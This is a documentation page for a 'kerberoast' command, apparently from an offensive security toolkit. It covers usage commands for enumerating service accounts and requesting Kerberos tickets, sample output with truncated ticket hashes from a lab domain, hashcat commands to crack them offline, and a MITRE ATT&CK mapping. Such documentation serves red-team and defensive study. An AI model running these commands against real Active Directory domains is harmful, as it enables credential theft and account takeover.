+++
title = "kerberoast"
chapter = false
weight = 143
hidden = false
+++

## Summary

Request TGS (Ticket Granting Service) tickets for accounts with Service Principal Names (SPNs) and extract the encrypted ticket data in hashcat-compatible format for offline password cracking. This is known as Kerberoasting.

The command automatically enumerates kerberoastable accounts via LDAP (excluding `krbtgt` which is not crackable), then requests TGS tickets from the KDC for each SPN. The extracted hashes can be cracked offline with hashcat or john.

Uses the `gokrb5` library for Kerberos protocol operations and `go-ldap` for SPN enumeration. Pure Go, no external tools needed.

## Arguments

Argument | Required | Description
---------|----------|------------
server | Yes | Domain Controller IP or hostname (KDC)
username | Yes | Domain user for authentication (UPN format: `user@domain.local`)
password | Yes | Domain user password
realm | No | Kerberos realm (auto-detected from username UPN if omitted)
spn | No | Specific SPN to roast (if omitted, auto-enumerates all kerberoastable accounts via LDAP)
port | No | LDAP port for SPN enumeration (default: 389)
base_dn | No | LDAP search base (auto-detected from RootDSE if omitted)
use_tls | No | Use LDAPS for SPN enumeration (default: false)

## Usage

Auto-enumerate and roast all kerberoastable accounts:
```
kerberoast -server 192.168.1.1 -username user@domain.local -password pass
```

Roast a specific SPN:
```
kerberoast -server dc01 -username user@domain.local -password pass -spn MSSQLSvc/db.domain.local
```

With explicit realm:
```
kerberoast -server 192.168.1.1 -realm DOMAIN.LOCAL -username user@domain.local -password pass
```

## Example Output

```
[*] Kerberoasting 2 SPN(s) from ESSOS.LOCAL (KDC: 192.168.100.53)
------------------------------------------------------------

[+] sql_svc — MSSQLSvc/braavos.essos.local (RC4-HMAC)
$krb5tgs$23$*sql_svc$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local*$5f072ca978...

[+] sql_svc — MSSQLSvc/braavos.essos.local:1433 (RC4-HMAC)
$krb5tgs$23$*sql_svc$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local:1433*$6f29d68a...

[*] 2/2 hashes extracted (hashcat -m 13100 for RC4, -m 19600 for AES128, -m 19700 for AES256)
```

## Cracking Hashes

Save the `$krb5tgs$...` lines to a file and crack with:

```bash
# RC4-HMAC (etype 23) — most common, fastest to crack
hashcat -m 13100 -a 0 hashes.txt wordlist.txt

# AES128-CTS (etype 17)
hashcat -m 19600 -a 0 hashes.txt wordlist.txt

# AES256-CTS (etype 18)
hashcat -m 19700 -a 0 hashes.txt wordlist.txt
```

## MITRE ATT&CK Mapping

- **T1558.003** - Steal or Forge Kerberos Tickets: Kerberoasting

{{% notice info %}}Cross-Platform — works on Windows, Linux, and macOS{{% /notice %}}
